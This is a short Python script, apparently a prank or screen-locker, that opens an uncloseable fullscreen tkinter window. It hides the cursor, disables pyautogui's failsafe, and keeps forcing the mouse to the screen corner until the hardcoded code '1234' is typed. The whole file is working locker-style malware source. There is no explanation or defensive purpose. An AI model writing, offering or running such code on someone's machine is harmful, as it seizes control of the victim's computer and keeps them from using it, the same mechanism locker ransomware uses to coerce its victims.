from tkinter import Tk, Entry, Label 
import pyautogui, sys 
  
  
root = Tk() 
  
label = Label(root, text="North", font='Courier 8') 
label.place(relx=.5, rely=.94, anchor="center") 
  
label = Label(root, text="popa", font='Courier 30') 
label.place(relx=.5, rely=.4, anchor="center") 
  
entry = Entry(root, font='Courier 16') 
entry.place(relx=.5, rely=.5, anchor="center", width=380, height=40) 
entry.focus() 
  
root.protocol('WM_DELETE_WINDOW', lambda: None) 
root.attributes('-fullscreen', True) 
root.config(cursor="none") 
pyautogui.FAILSAFE = False 
  
while True: 
    pyautogui.moveTo(0, 0) 
    root.update() 
    if entry.get() == "1234": 
        sys.exit()
